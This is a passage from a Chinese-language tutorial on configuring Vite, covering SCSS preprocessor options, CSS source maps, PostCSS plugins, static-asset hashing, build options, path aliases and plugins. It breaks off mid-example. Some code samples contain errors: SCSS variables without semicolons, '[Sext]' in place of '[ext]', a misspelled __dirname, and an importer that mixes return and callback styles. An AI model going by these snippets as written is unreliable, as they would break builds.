│       ├── variables.scss  // 定义了 $primary-color: #1890ff;
│       └── mixins.scss     // 定义了 @mixin flex-center { ... }
└── components/
    └── Button/
        └── index.scss
</code></pre>
<p>如果你不配置 <code>additionalData</code>，那么在 <code>Button/index.scss</code> 中，你必须这样写：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Button/index.scss</span>
<span class="hljs-keyword">@import</span> <span class="hljs-string">'../../assets/styles/variables.scss'</span>;
<span class="hljs-keyword">@import</span> <span class="hljs-string">'../../assets/styles/mixins.scss'</span>;

<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-variable">$primary-color</span>;
  <span class="hljs-keyword">@include</span> flex-center;
}
</code></pre>
<p>如果项目大了，每个文件都要写这么一长串 <code>@import</code>，不仅麻烦，而且容易出错。</p>
<p><strong>使用 <code>additionalData</code> 后，你的 <code>vite.config.js</code> 可以这样配置：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>; <span class="hljs-comment">// 需要引入 path 模块来处理路径</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// ... 其他配置</span>
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: {
        <span class="hljs-attr">additionalData</span>: <span class="hljs-string">`
          @import "@/assets/styles/variables.scss";
          @import "@/assets/styles/mixins.scss";
        `</span>,
      },
    },
  },
  <span class="hljs-comment">// 为了让 @/ 能正确指向 src 目录，通常需要配置 resolve</span>
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">'@'</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'src'</span>),
    },
  },
});
</code></pre>
<p><strong>注意：</strong></p>
<ul>
<li><code>@/</code> 是一个别名，代表 <code>src/</code> 目录，这需要在 <code>resolve.alias</code> 中配置。</li>
<li>引入的文件路径是相对于项目根目录的，或者相对于 <code>alias</code> 配置的路径。</li>
<li>可以把这段注入的代码想象成一个 “隐形的” 头部，自动加到了每个 <code>.scss</code> 文件的最前面。</li>
</ul>
<p>现在，你的 <code>Button/index.scss</code> 就可以变得非常干净</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Button/index.scss</span>
<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-variable">$primary-color</span>; <span class="hljs-comment">// 直接使用，无需手动导入</span>
  <span class="hljs-keyword">@include</span> flex-center;  <span class="hljs-comment">// 直接使用</span>
}
</code></pre>
<p><strong>场景二：定义全局变量或混合宏</strong></p>
<p>如果你只有一两个简单的全局变量，不想为此创建一个文件，可以直接写在 <code>additionalData</code> 里。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: {
        <span class="hljs-attr">additionalData</span>:  <span class="hljs-string">`
          $primary-color: #1890ff
          $secondary-color: #41b883
          $font-size-base: 16px
          $border-radius: 4px
        `</span>,
      },
    },
  },
});
</code></pre>
<p>这样，在任何 <code>.scss</code> 文件中，你都可以直接使用 <code>background: $primary-color;</code>。</p>
<h5 data-id="heading-40"><strong>2. <code>importer</code> (高级用法)</strong></h5>
<p>这是一个函数，用于自定义 SCSS 的 <code>@import</code> 解析逻辑。当 SCSS 编译器遇到一个 <code>@import</code> 语句时，它会调用这个函数，让你有机会去自定义文件的查找和读取方式。</p>
<p>这通常用于一些比较复杂的场景，例如：</p>
<ul>
<li>从 <code>node_modules</code> 中引入文件时，可以省略长长的路径。</li>
<li>根据不同的环境（开发 / 生产）引入不同的主题文件。</li>
</ul>
<p><strong>示例：</strong></p>
<p>假设你想让 <code>@import 'my-theme';</code> 能够直接找到 <code>src/themes/main.scss</code> 文件。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>;
<span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">'fs'</span>; <span class="hljs-comment">// 文件系统模块</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: {
        <span class="hljs-title function_">importer</span>(<span class="hljs-params">url, prev, done</span>) {
          <span class="hljs-comment">// url 是 @import 的目标，比如 'my-theme'</span>
          <span class="hljs-comment">// prev 是当前文件的路径</span>
          
          <span class="hljs-keyword">if</span> (url === <span class="hljs-string">'my-theme'</span>) {
            <span class="hljs-keyword">const</span> themePath = path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'src/themes/main.scss'</span>);
            <span class="hljs-comment">// 读取文件内容并返回</span>
            <span class="hljs-keyword">return</span> { <span class="hljs-attr">contents</span>: fs.<span class="hljs-title function_">readFileSync</span>(themePath, <span class="hljs-string">'utf8'</span>) };
          }
          
          <span class="hljs-comment">// 如果不是我们关心的 url，就返回 null，让 SCSS 按默认方式处理</span>
          <span class="hljs-title function_">done</span>({ <span class="hljs-attr">file</span>: url });
        }
      },
    },
  },
});
</code></pre>
<h5 data-id="heading-41"><strong>3. <code>outputStyle</code></strong></h5>
<p>这个配置项用来指定最终生成的 CSS 代码的风格。</p>
<ul>
<li><code>'expanded'</code>: 展开的风格，每个选择器和属性都单独一行，可读性最好（默认）。</li>
<li><code>'compressed'</code>: 压缩后的风格，所有代码都挤在一行，没有空格和换行，文件体积最小。</li>
</ul>
<p><strong>注意</strong>：这个配置是作用于 SCSS 编译器本身的。在 Vite 中，开发环境下，最终的 CSS 输出还会受到 Vite 自身的 <code>build.cssMinify</code> 配置影响。通常，我们只在需要单独调试 SCSS 输出时才会关注这个选项。</p>
<h3 data-id="heading-42">css.devSourcemap(源映射)</h3>
<p><code>devSourcemap</code> 是开发环境中用于生成 CSS 源映射的配置，让浏览器开发者工具直接关联原始源码（如 SCSS、Less），而非编译后的压缩 CSS。</p>
<p>因为使用 CSS 预处理器（SCSS、Less、Stylus）时，编译后的代码与源码结构差异大，需源映射关联，以提高调试效率。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">devSourcemap</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 开发环境开启源映射</span>
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: { <span class="hljs-comment">/* 预处理器配置 */</span> }
    }
  }
}
</code></pre>
<p>当我们不配置<code>devSourcemap</code>时</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.base.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">// 基础公共配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">css</span>: { <span class="hljs-comment">// 配置css行为</span>
        <span class="hljs-attr">devSourcemap</span>: <span class="hljs-literal">false</span>
    }
})

</code></pre>
<p>启动开发服务器，如图当我们查看某一个元素的样式时，不会指出css来源</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f930ff9bb9144f51847f86cc0fa19140~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=EyKMnO34q7YVzBNV3o3kYxJVMjU%3D" loading="lazy"/>
<p>当配置<code>devSourcemap</code>为<code>true</code>时，再次查看</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0b37cac61db4d45a7e37efd5e709747~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=39rE9wCYL7KhLqs07VtYgmUOmRI%3D" loading="lazy"/>
<p>推荐在开发环境下开始源码映射，生产环境建议关闭，避免暴露源码结构.</p>
<h3 data-id="heading-43">css.postcss</h3>
<p>这是 Vite 中用于<strong>配置 PostCSS 处理器</strong>的核心选项。PostCSS 本身是一个用 JavaScript 工具和插件转换 CSS 代码的工具，可以通过其丰富的插件来实现<strong>自动添加浏览器前缀、CSS语法降级、代码质量检查与规范约束、使用未来 CSS 语法、代码压缩优化</strong>等功能。在 Vite 中内置并支持PostCSS，但是如果要使用它的插件需要安装相关依赖</p>
<h4 data-id="heading-44">常用的PostCSS插件</h4>
<ul>
<li>
<p><code>postcss-preset-env</code>PostCSS预设包，预设了一些常用的插件的配置项（例如<code>autoprefixer</code>的自动补全）</p>
</li>
<li>
<p><code>autoprefixer</code>: 根据<code>package.json</code>的<code>browserslist</code>配置自动添加浏览器前缀（如<code>-webkit-</code>、<code>-moz-</code>）</p>
</li>
<li>
<p><code>cssnano</code>:压缩 CSS 代码，移除空格、注释、合并重复规则，减少文件体积</p>
</li>
<li>
<p><code>stylelint</code>:检查 CSS 代码中的语法错误和风格问题（如属性排序、单位规范）</p>
</li>
<li>
<p><code>postcss-modules</code>:实现CSS模块化，避免样式污染(类似Vue的<code>&lt;style scoped&gt;</code>)</p>
</li>
</ul>
<p>**browserslist 配置 **</p>
<p>在<code>package.json</code>中来配置兼容范围的好处就是，可以使得<code>babel</code>和<code>PostCSS</code>处理语法兼容性的问题时的兼容范围一致</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json</span>
<span class="hljs-punctuation">{</span>
	<span class="hljs-attr">"browserslist"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"cover: 99.5%"</span><span class="hljs-punctuation">]</span>
<span class="hljs-comment">//"cover: 99.5%" 表示让 PostCSS 等工具适配全球 99.5% 的浏览器，</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-45">vite中配置</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> postcssPresetEnv <span class="hljs-keyword">from</span> <span class="hljs-string">'postcss-preset-env'</span>
<span class="hljs-comment">// import autoprefixer from 'autoprefixer'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">css</span>: {
       <span class="hljs-attr">postcss</span>: { <span class="hljs-comment">// 配置postcss，完全支持在.postcss.config.js中的所能使用的配置项</span>
            <span class="hljs-attr">plugins</span>: [ <span class="hljs-comment">// 安装postcss插件</span>
                <span class="hljs-title function_">postcssPresetEnv</span>({})
                <span class="hljs-comment">// autoprefixer({</span>
                <span class="hljs-comment">//     // 指定兼容 99.5%的浏览器。</span>
                <span class="hljs-comment">//     // browsers: ["cover 99.5%"],</span>
                <span class="hljs-comment">//     // 也可以在package.json中配置browerslist配置项</span>
                <span class="hljs-comment">// })</span>
            ]
        },
    }
})
</code></pre>
<p><code>b.modules.css</code>中：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.demo</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">background-color</span>: skyblue;
}

<span class="hljs-selector-class">.demo-content</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">background-color</span>: green;
    <span class="hljs-attribute">display</span>: flex; // 添加该行属性
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea29ac21cfbf49e9910cb8e04e9a1fb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=hD3W1jKuIlKxbMOg1f5aqUBXZwo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-46">Vite加载静态资源</h3>
<p><strong>静态资源</strong></p>
<p>静态资源通常来说是网站中哪些不会随请求变化而变化的文件，浏览器可直接下载并渲染 / 使用，无需额外编译（或仅需前端构建工具预处理）。</p>
<p>常见的静态资源包括：</p>
<ul>
<li>图片：PNG、JPG、GIF、SVG、WebP等</li>
<li>字体：TTF、OTF、WOFF、WOFF等</li>
<li>媒体：MP4、WebM、MP3、AAC等</li>
<li>样式：CSS文件</li>
<li>脚本：不涉及服务端动态逻辑的JS文件（第三方库、前端工具脚本）</li>
<li>其他：图标（favicon.ico）、JSON配置文件、静态HTML等</li>
</ul>
<h4 data-id="heading-47">vite中的静态资源</h4>
<p>Vite 中对静态资源处理的范围是静态资源的一个子集，主要识别一下两种为Vite所认为的静态资源</p>
<ul>
<li>当你在代码中通过 <code>import</code> 或 <code>require</code> 导入一个非 JavaScript 文件时，Vite 会将其视为一个需要被处理的静态资源。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> logo <span class="hljs-keyword">from</span> <span class="hljs-string">'./assets/logo.png'</span>; <span class="hljs-comment">// Vite 会处理 logo.png</span>
<span class="hljs-keyword">import</span> style <span class="hljs-keyword">from</span> <span class="hljs-string">'./style.css'</span>;     <span class="hljs-comment">// Vite 会处理 style.css</span>
</code></pre>
<ul>
<li>Vite 会将项目根目录下 <code>public</code> 文件夹中的所有文件，视为<strong>无需处理的静态资源</strong>。</li>
</ul>
<h4 data-id="heading-48">生产环境下Vite对静态资源的处理行为</h4>
<p><strong>浏览器缓存</strong></p>
<p>我们通过之前的学习已经知道了浏览器的缓存机制（尤其是强缓存，如 <code>Cache-Control: max-age=31536000</code>）会根据<strong>文件名</strong>来判断是否需要重新请求资源。所以呢当文件内容变动而文件名没有发生改变时，浏览器会继续使用缓存文件，而不是重新请求文件。</p>
<p><strong>Vite 的hash命名处理</strong></p>
<p>Vite 根据每一个文件的内容计算出一个哈希值，然后将这个哈希值作为文件的一部分对文件进行重命名(demo.[hash].js)</p>
<p>,所以一旦内容发生变动，哈希值就会发生变动。</p>
<p><strong>与浏览器缓存机制的配合</strong></p>
<p>利用浏览器缓存策略和Vite的哈希计算命名，就可以很好的控制浏览器的请求资源的行为：</p>
<ul>
<li>当文件没有发生改变时，文件名不变，浏览器使用缓存文件。</li>
<li>当文件内容发生改变时，文件名发生改变，浏览器重新请求文件，并再次缓存。</li>
</ul>
<p>例如在<code>main.js</code>的内容如下</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello world'</span>)
</code></pre>
<p>启动生产构建命令：<code>pnpm build</code>时，查看项目根目录下的<code>dist</code>目录下</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04d61f3fff7d441eb0046ea627eb6b96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=jpC5hgNDAujXFd30sE4dFbGKDaA%3D" alt="" loading="lazy"/></p>
<p>当在最后一行添加注释后，重新构建</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello world'</span>)
<span class="hljs-comment">// 新增注释</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/988969f749cf4648a5a08e44b546c527~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=QVvb1h2CKhnDFjyxhpmVExTIexY%3D" alt="" loading="lazy"/></p>
<p>可以看到文件名发生了变化</p>
<h4 data-id="heading-49">.build.rollupOptions</h4>
<p>在该配置项下可以配置<code>Rollup</code>的打包行为，因为生产环境下 <strong>Vite</strong> 使用 <strong>Rollup</strong>进行打包。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">// 生产环境配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (env) =&gt; <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">build</span>: {
        <span class="hljs-attr">assetsInlineLimit</span>: <span class="hljs-number">10</span> * <span class="hljs-number">1024</span>, 
        <span class="hljs-attr">rollupOptions</span>: { <span class="hljs-comment">// 配置rollup的一些构建策略</span>
            <span class="hljs-attr">output</span>: { <span class="hljs-comment">// 控制输出行为</span>
                <span class="hljs-attr">assetFileNames</span>: <span class="hljs-string">"[hash].[name].[Sext]"</span>
                <span class="hljs-comment">/** 处理打包后静态资源文件名
                 * * hash - Rollup根据文件内容计算的哈希值
                 * * name - 原文件名，如demo.js，name="demo"
                 * * .ext - 文件后缀名，如`.js、.vue...`
                 */</span>
            },
        },
    },
})
</code></pre>
<p>运行一下<code>pnpm build</code>，查看<code>dist</code>目录下的变化，可以看到静态资源的文件名处理行为已经改为hash值在前了</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7257d783864749daa3b5787771ccbde3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=BqTium%2B8EdWt2e4OdFYvAMG6Ujc%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-50">.build.assetsInlineLimit</h4>
<ul>
<li><strong>默认值</strong>：<code>4096</code> (4KB）。</li>
<li>生产环境下，对于<strong>小于或等于</strong> <code>assetsInlineLimit</code> 的值，Vite 会将其<strong>直接内联</strong>到最终的 JS 或 CSS 文件中，而不是生成一个单独的文件。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-comment">// 生产环境配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (env) =&gt; <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">build</span>: {
        <span class="hljs-attr">assetsInlineLimit</span>: <span class="hljs-number">10</span> * <span class="hljs-number">1024</span>,
    }
})
</code></pre>
<p>如果某个图片资源小于10KB，Vite就会将其转换为<code>base64</code>格式内联到项目中，反之则处理为静态资源。</p>
<p>对于有很多图标或者图片小于10KB的项目来说可以极大的减少http请求，提高网页性能。不过转换为<code>base64</code>字符串格式之后，体积一般会增大30%。</p>
<h3 data-id="heading-51">.build.outDir</h3>
<ul>
<li>配置生产环境打包后的文件夹名</li>
<li><strong>默认值</strong>："dist"</li>
<li>**类型：**字符串</li>
</ul>
<h3 data-id="heading-52">.build.assetsDir</h3>
<ul>
<li>配置生产环境打包后的静态资源文件夹名</li>
<li><strong>默认值：</strong>"assets"</li>
<li>**类型：**字符串</li>
</ul>
<h3 data-id="heading-53">配置路径别名</h3>
<p>通常在项目中问我们可以看到如下的导入方式</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">SchedulStaff</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/views/schedule/staff/index.vue'</span>
</code></pre>
<p>可以看到路径开头是<code>'@'</code>不是相对路径也不是绝对路径的形式，这就是路径别名，用<code>@</code>来代替部分路径。</p>
<p>所以对于深层目录下的文件导入上层资源时，容易出现 <code>../../views/schedule/staff/index.vue</code> 这类难以维护的路径，<code>@</code> 可直接简化为 <code>@/views/schedule/staff/index.vue</code>。</p>
<h4 data-id="heading-54"><strong>.resovle.alias</strong></h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span> <span class="hljs-comment">// node内置模块</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
	<span class="hljs-attr">resolve</span>: {
		<span class="hljs-attr">alias</span>: {
			<span class="hljs-string">"@"</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'src'</span>),
            <span class="hljs-string">"@assets"</span>: path.<span class="hljs-title function_">resolve</span>(__diname, <span class="hljs-string">'src/assets'</span>),
            <span class="hljs-comment">/**
             * path.resolve() - path模块提供的拼接路径的方法
             * ——dirname - node内置变量，获取当前配置文件所在目录的绝对路径
             */</span>
		}
	}
})
</code></pre>
<p>配置完成后，在Vite项目中就可以使用<code>@</code>来代替指定的路径。</p>
<p>在<code>src/test.js</code>中写入</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'路径别名配置成功'</span>)
</code></pre>
<p>在<code>main.js</code>中引入</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">'@/test.js'</span>
</code></pre>
<p>启动项目，打开浏览器控制台：</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/166b4bc1597b4d6e868da30f02ffff76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=TwOm%2Fqa06A2ZR%2Bt6cshu69Adi2k%3D" loading="lazy"/>
<h4 data-id="heading-55">路径提示以及TS项目中配置</h4>
<p>默认情况下配置好了路径别名后，Vite能识别别名但是不会做出路径提示</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5531d327a9f4395bc6a5342c233aa65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=zjSTR0eDeXe3%2FfhNncsqLhUq%2B5E%3D" loading="lazy"/>
<p>可以在<code>jsconfig.json</code>或者<code>tsconfig.json</code>中写入如下配置</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"compilerOptions"</span>: {
    <span class="hljs-string">"baseUrl"</span>: <span class="hljs-string">"."</span>,
    <span class="hljs-string">"paths"</span>: {
      <span class="hljs-string">"@/*"</span>: [<span class="hljs-string">"src/*"</span>], <span class="hljs-comment">// 与 Vite 配置一致</span>
      <span class="hljs-string">"@assets/*"</span>: [<span class="hljs-string">"src/assets/*"</span>]
    }
  }
}
</code></pre>
<p>以上配置有如下效果</p>
<ul>
<li>在项目中出现路径提示功能</li>
</ul>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a485794c1534bcabc80c179f48a9d59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=%2BbcXjJSN87HFm1MwjMQc9ZpRj7s%3D" loading="lazy"/>
<ul>
<li>TypeScript 项目，vite中配置别名后需要配合在 <code>tsconfig.json</code> 中补充路径映射，否则 TS 会提示 “模块找不到”：</li>
</ul>
<h4 data-id="heading-56">两种路径风格</h4>
<p>在用 Vue 脚手架工具时我们会发现，在配置路径别名的时候，路径配置用的时如下方式，<code>fileURLToPath(new URL('src', import.meta.url))</code>这种方式是<strong>现代的 ES Modules (ESM) 风格</strong>，而对于<code>path.resolve(__dirname, 'src')</code>是<strong>CommonJS风格</strong>的方式。</p>
<ul>
<li><strong><code>import.meta.url</code></strong>: 这是 ESM 模块中的一个元数据属性。它返回当前模块文件的<strong>文件 URL 地址</strong>。</li>
<li><strong><code>new URL('src', import.meta.url)</code></strong>: 这里使用了浏览器和 Node.js 都支持的 <code>URL</code> 构造函数。它的第二个参数是<strong>基准 URL</strong>。这个操作会将相对路径 <code>'src'</code> 解析为基于当前模块 URL 的一个<strong>绝对 URL</strong>。结果会是 <code>file:///path/to/your/project/src</code>。</li>
<li><strong><code>fileURLToPath()</code></strong>: 这是 Node.js <code>url</code> 模块提供的一个方法。它的作用是将一个 <code>file:</code> 协议的 URL 对象或字符串，转换为 Node.js 所使用的<strong>本地文件系统路径字符串</strong>（例如 <code>C:\path\to\src</code> 或 <code>/path/to/src</code>）。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { fileURLToPath, <span class="hljs-variable constant_">URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:url'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
	<span class="hljs-attr">resolve</span>: {
		<span class="hljs-attr">alias</span>: {
            <span class="hljs-string">"@assets"</span>: <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'src'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>)),
		}
	}
})
</code></pre>
<p>Vite使用的是ESM风格，所以 Vite也更推荐使用<code>fileURLToPath(new URL('src', import.meta.url))</code></p>
<p>这种方式来进行路径配置。</p>
<h3 data-id="heading-57">Vite 插件</h3>
<p>Vite 插件是基于 <strong>Rollup 插件接口</strong> 扩展的工具，用于增强 Vite 的核心能力（如模块转换、依赖处理、服务器中间件、构建优化等）。Vite 本身的很多核心功能（如 CSS 处理、TS 转译）也是通过内置插件实现的，第三方插件可以无缝集成，覆盖开发 / 构建全流程。</p>
<h4 data-id="heading-58">@vitejs/plugin-legacy</h4>
<p>Vite 官方插件，核心作用是对 js 语法降级<strong>让生产环境的构建产物兼容旧版浏览器</strong>（比如 IE11、旧版 Chrome/Firefox）。</p>
<p><strong>安装</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">// npm
npm install @vitejs/plugin-legacy --save-dev
// pnpm
pnpm add @vitejs/plugin-legacy -D
</code></pre>
<p><strong>配置</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> legacy <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-legacy'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">legacy</span>({
      <span class="hljs-attr">targets</span>: [<span class="hljs-string">'defaults'</span>, <span class="hljs-string">'not IE 11'</span>] <span class="hljs-comment">// 支持的目标浏览器（排除 IE11）</span>
      <span class="hljs-comment">// 也可以在package.json中配置browerslist配置项，统一css、js语法降级范围  </span>
    })
  ]
});
</code></pre>
<p><strong>使用：</strong></p>
<p>配置完成后运行<code>pnpm build</code>命令Vite就会在对应的时机使用该插件进行JS语法降级</p>
<h4 data-id="heading-59"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fenjoycoding%2Fvite-plugin-mock-server" target="_blank" title="https://github.com/enjoycoding/vite-plugin-mock-server" ref="nofollow noopener noreferrer">vite-plugin-mock</a></h4>
<p><code>vite-plugin-mock</code> 是一个在 Vite 项目中模拟后端 API 的插件，其内部依赖<code>mock.js</code>，它的核心作用是<strong>在开发环境中拦截前端发起的 API 请求，并返回预设的模拟数据</strong>，从而让前端开发可以不依赖真实的后端服务就能独立进行。</p>
<p><strong>安装</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">npm install vite-plugin-mock --save-dev
pnpm add vite-plugin-mock -D
</code></pre>
<p><strong>配置</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> { viteMockServe } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-mock'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
		<span class="hljs-title function_">viteMockServe</span>({
